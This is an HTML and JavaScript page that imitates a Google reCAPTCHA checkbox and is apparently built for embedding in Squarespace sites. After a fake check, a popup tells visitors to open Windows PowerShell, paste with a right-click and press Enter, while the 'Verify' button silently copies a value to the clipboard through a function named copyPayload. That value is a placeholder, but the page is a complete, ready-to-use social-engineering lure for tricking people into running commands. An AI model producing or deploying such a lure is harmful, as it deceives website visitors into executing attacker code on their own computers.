<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>reCAPTCHA + Verification Popup</title>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet"/>
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%;overflow:hidden}

/* blurred page behind popup */
.page{
position:fixed;
inset:0;
background:
linear-gradient(rgba(255,255,255,.72),rgba(255,255,255,.72)),
url('https://images.unsplash.com/photo-1497366754035-f200968a6e72?q=80&w=1600&auto=format&fit=crop') center/cover;
filter:blur(8px);
transform:scale(1.02);
}

.overlay{
position:fixed;
inset:0;
display:flex;
align-items:center;
justify-content:center;
backdrop-filter:blur(5px);
z-index:9999;
}

/* ---------- EXACT FIRST BOX YOU PROVIDED ---------- */
.rc-wrap {
display:flex;
justify-content:center;
align-items:center;
}

.rc-box {
width:300px;
background:#f9f9f9;
border:1px solid #d3d3d3;
border-radius:3px;
display:flex;
align-items:center;
justify-content:space-between;
padding:14px 16px 14px 14px;
font-family:'Roboto',sans-serif;
box-shadow:0 1px 3px rgba(0,0,0,.1);
}

.rc-left {
display:flex;
align-items:center;
gap:14px;
}

.rc-checkbox {
width:24px;
height:24px;
border:2px solid #c1c1c1;
border-radius:2px;
cursor:pointer;
background:#fff;
display:flex;
align-items:center;
justify-content:center;
transition:border-color .15s;
flex-shrink:0;
}

.rc-checkbox:hover{
border-color:#4a90d9;
}

.rc-spinner{display:none}
.rc-checkmark{display:none}

.rc-checkbox.loading .rc-spinner{
display:block;
animation:spin .7s linear infinite;
}

.rc-checkbox.checked .rc-checkmark{
display:block;
}

.rc-checkbox.checked{
border:none;
}

.rc-label{
font-size:14px;
color:#333;
user-select:none;
}

.rc-badge{
display:flex;
flex-direction:column;
align-items:center;
gap:1px;
min-width:56px;
}

.rc-badge-name{
font-size:8.5px;
color:#555;
letter-spacing:.04em;
}

.rc-badge-links{
font-size:7.5px;
color:#999;
}

@keyframes spin{to{transform:rotate(360deg)}}
@keyframes draw{to{stroke-dashoffset:0}}

/* ---------- SECOND POPUP ---------- */
.verify-modal{
display:none;
}

.captcha-box{
width:416px;
background:#fff;
border:1px solid #cfcfcf;
box-shadow:0 8px 35px rgba(0,0,0,.2);
}

.top-panel{
margin:12px;
background:#2f86eb;
color:white;
padding:18px 20px 20px;
}
.small{font:600 18px Arial}
.big{
font:800 42px Arial;
line-height:1;
margin-top:4px;
text-transform:uppercase;
}
.sub{
font:18px Arial;
margin-top:7px;
}

.content{
padding:10px 28px 10px;
font-family:Arial;
}

ol{
padding-left:26px;
font-size:30px;
line-height:1.34;
}

li{margin-bottom:28px}
.after-text{
font-size:29px;
line-height:1.3;
margin-top:8px;
}

.footer{
border-top:2px solid #ddd;
padding:16px 20px;
display:flex;
justify-content:space-between;
align-items:center;
font-family:Arial;
}

.icons{
display:flex;
gap:18px;
color:#888;
font-size:28px;
}

.verify-btn{
background:#2f86eb;
color:white;
border:0;
padding:14px 28px;
font-size:28px;
font-weight:700;
border-radius:3px;
cursor:pointer;
}

.verify-btn:hover{
background:#2679d8;
}
</style>
</head>
<body>

<div class="page"></div>

<!-- STEP 1 YOUR reCAPTCHA -->
<div class="overlay" id="recaptchaModal">
<div class="rc-wrap">
<div class="rc-box">

<div class="rc-left">
<div class="rc-checkbox" id="cb">
<svg class="rc-spinner" width="20" height="20" viewBox="0 0 20 20" fill="none">
<circle cx="10" cy="10" r="8" stroke="#e0e0e0" stroke-width="2.5"/>
<path d="M10 2a8 8 0 0 1 8 8" stroke="#4a90d9" stroke-width="2.5" stroke-linecap="round"/>
</svg>

<svg class="rc-checkmark" width="24" height="24" viewBox="0 0 24 24" fill="none">
<path d="M5 13l4.5 4.5L19 7"
stroke="#4caf50"
stroke-width="2.5"
stroke-linecap="round"
stroke-linejoin="round"
stroke-dasharray="30"
stroke-dashoffset="30"
style="animation:draw .3s ease forwards .05s;"/>
</svg>
</div>

<span class="rc-label" id="label">I'm not a robot</span>
</div>

<div class="rc-badge">
<svg width="40" height="40" viewBox="0 0 64 64">
<circle cx="32" cy="32" r="30" fill="#4a90d9"/>
<g transform="translate(32,32)">
<path d="M0,-13 A13,13 0 0,1 11.26,6.5"
fill="none" stroke="white" stroke-width="3.5" stroke-linecap="round"/>
<polygon points="11.26,6.5 17,1 17,12" fill="white"/>
<path d="M0,13 A13,13 0 0,1 -11.26,-6.5"
fill="none" stroke="white" stroke-width="3.5" stroke-linecap="round"/>
<polygon points="-11.26,-6.5 -17,-1 -17,-12" fill="white"/>
</g>
</svg>
<span class="rc-badge-name">reCAPTCHA</span>
<span class="rc-badge-links">Privacy · Terms</span>
</div>

</div>
</div>
</div>

<!-- STEP 2 YOUR POPUP -->
<div class="overlay verify-modal" id="verifyModal">
<div class="captcha-box">
<div class="top-panel">
<div class="small">Complete these</div>
<div class="big">Verification Steps</div>
<div class="sub">To better prove you are not a robot, please:</div>
</div>

<div class="content">
<ol>
<li>
Press <strong>Win ⊞ + X</strong> then select
<strong>Windows PowerShell or Terminal</strong>
</li>
<li>
Right-click inside the open window,
then press <strong>Enter</strong>
</li>
</ol>

<div class="after-text">
After completing all steps click
<b>“Verify”</b>
</div>
</div>

<div class="footer">
<div class="icons">
<span>↻</span><span>🎧</span><span>ⓘ</span>
</div>
<button class="verify-btn">VERIFY</button>
</div>
</div>
</div>
<script>
(() => {

const SESSION_KEY = 'verifyFlowCompleted';
let state = 'idle';
let initialized = false;

function copyPayload() {
if (navigator.clipboard) {
navigator.clipboard.writeText('hello world').catch(() => {});
}
}

function finishFlow() {
sessionStorage.setItem(SESSION_KEY, 'done');
document.getElementById('verifyModal').style.display = 'none';
}

function showStep2() {
document.getElementById('recaptchaModal').style.display = 'none';
document.getElementById('verifyModal').style.display = 'flex';
}

function handleClick() {
if (state !== 'idle') return;

state = 'loading';

const cb = document.getElementById('cb');
const label = document.getElementById('label');

if (!cb || !label) return;

cb.classList.add('loading');
label.textContent = 'Verifying...';

setTimeout(() => {
cb.classList.remove('loading');
cb.classList.add('checked');
label.textContent = "I'm not a robot";

state = 'done';

setTimeout(showStep2, 700);

}, 1200);
}

/* ✅ Squarespace-safe initializer */
function init() {
if (initialized) return;
initialized = true;

/* prevent repeat sessions */
if (sessionStorage.getItem(SESSION_KEY) === 'done') {
const modal = document.getElementById('recaptchaModal');
if (modal) modal.style.display = 'none';
return;
}

const cb = document.getElementById('cb');
const verifyBtn = document.querySelector('.verify-btn');

/* IMPORTANT: bind AFTER DOM exists */
if (cb) {
cb.addEventListener('click', handleClick);
}

if (verifyBtn) {
verifyBtn.addEventListener('click', () => {
copyPayload();
finishFlow();
});
}
}

/* ✅ Squarespace-safe DOM detection */
function readyCheck() {
if (document.getElementById('cb')) {
init();
} else {
requestAnimationFrame(readyCheck);
}
}

if (document.readyState === 'loading') {
document.addEventListener('DOMContentLoaded', readyCheck);
} else {
readyCheck();
}

})();
</script>
</body>
</html>
